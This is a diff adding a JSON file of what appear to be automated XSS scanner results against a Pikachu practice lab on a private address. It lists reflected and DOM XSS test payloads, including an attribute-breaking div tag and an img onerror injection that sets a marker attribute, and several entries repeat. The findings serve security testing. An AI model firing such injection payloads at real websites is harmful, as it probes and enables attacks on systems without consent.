@@ -1,0 +1,93 @@
+[
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_reflected_get.php?message=test&submit=submit",
+    "payload": "\"><div data-test=\"DOMXSS_w51rvq8v\"></div>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_01.php?message=test&submit=submit",
+    "payload": "\"><div data-test=\"DOMXSS_6vh9bkjq\"></div>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_02.php?message=test&submit=submit",
+    "payload": "\"><div data-test=\"DOMXSS_itedxddl\"></div>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_03.php?message=test&submit=submit",
+    "payload": "document.documentElement.setAttribute('data-xss-found','DOMXSS_osyt5spt')",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_reflected_get.php",
+    "payload": "\"><img/src/onerror=document.documentElement.setAttribute('data-xss-found','DOMXSS_ni5393g2')>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_dom.php",
+    "payload": "\"><div data-test=\"DOMXSS_35wnzx7s\"></div>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_01.php",
+    "payload": "\"><div data-test=\"DOMXSS_r7fz74rh\"></div>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_02.php",
+    "payload": "\"><div data-test=\"DOMXSS_2rdfotjv\"></div>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_03.php",
+    "payload": "document.documentElement.setAttribute('data-xss-found','DOMXSS_vr53dnef')",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_reflected_get.php?message=test&submit=submit",
+    "payload": "\"><div data-test=\"DOMXSS_w51rvq8v\"></div>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_01.php?message=test&submit=submit",
+    "payload": "\"><div data-test=\"DOMXSS_6vh9bkjq\"></div>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_02.php?message=test&submit=submit",
+    "payload": "\"><div data-test=\"DOMXSS_itedxddl\"></div>",
+    "level": "high",
+    "hostid": 1
+  },
+  {
+    "vuln": "Unknown",
+    "url": "http://192.168.166.2/pikachu/vul/xss/xss_03.php?message=test&submit=submit",
+    "payload": "document.documentElement.setAttribute('data-xss-found','DOMXSS_osyt5spt')",
+    "level": "high",
+    "hostid": 1
+  }
+]
